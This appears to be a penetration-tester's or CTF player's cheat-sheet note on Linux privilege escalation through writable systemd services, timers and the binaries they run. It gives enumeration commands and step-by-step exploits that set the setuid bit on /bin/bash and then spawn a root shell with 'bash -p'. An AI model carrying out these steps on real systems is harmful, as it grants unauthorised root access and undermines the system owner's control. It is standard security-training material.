systemd runs services and timers as root. A writable `.service` (its ExecStart) or a writable binary it runs = root on restart/boot.
## Goal
Find a root service/timer whose unit file or target binary you can write, point it at your payload, trigger it.
## Tips
Modern boxes use systemd instead of cron. A writable `.service` or `.timer` in /etc/systemd/system is an instant win.

> Not writable, but a root service exposes a loopback listener or runs with secrets in its args/env? That's a separate vector — map it via [[internal_port_enum]] and the process/env orientation in [[00 master checklist]].

Checklist:
- [ ] writable `.service` / `.timer` in /etc/systemd/system?
- [ ] is the ExecStart binary writable?
- [ ] does a timer run a service as root?
- [ ] can you restart it (sudo) or must you wait for reboot/timer?
# Commands

### Step 1: enumerate
```bash
systemctl list-units --type=service --state=running   # running services
systemctl list-timers --all                            # timers
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null
```

### Step 2: inspect a target
```bash
systemctl cat <service>           # see ExecStart=
ls -la /path/to/ExecStart/binary  # writable?
```

## Exploit
### Case 1: Writable .service ExecStart
**Enumerate:**
```bash
ls -la /etc/systemd/system/<svc>.service   # writable unit file
systemctl cat <svc>                         # ExecStart=/opt/run.sh
```
**Exploit:**
```bash
# edit ExecStart to your payload:
#   ExecStart=/bin/bash -c 'chmod +s /bin/bash'
systemctl daemon-reload ; systemctl restart <svc>   # if allowed; else reboot
/bin/bash -p
```

### Case 2: Writable binary run by a root service
**Enumerate:**
```bash
systemctl cat <svc> | grep ExecStart
ls -la <that_binary>      # writable?
```
**Exploit:**
```bash
echo 'chmod +s /bin/bash' >> <that_binary>   # or replace it
# restart svc / wait for timer -> /bin/bash -p
```

### Case 3: Writable timer
**Enumerate:**
```bash
ls -la /etc/systemd/system/*.timer ; systemctl list-timers
```
**Exploit:**
```bash
# point the timer's service at your payload; it fires on schedule -> root
```

## Helpline:
1. systemd commands
```
systemctl list-units --type=service     # services
systemctl list-timers --all             # timers (cron-like)
systemctl cat <svc>                     # show unit + ExecStart
systemctl restart <svc> / daemon-reload # apply changes (if permitted)
```

2. The ExecStart line
```
[Service]
ExecStart=/opt/run.sh    <- if THIS file, or the .service, is writable = root
runs as root unless User= is set.
```

3. Trigger options
```
sudo systemctl restart <svc> (if allowed) | reboot | wait for a timer
relative path in ExecStart -> PATH hijack like cron.
```
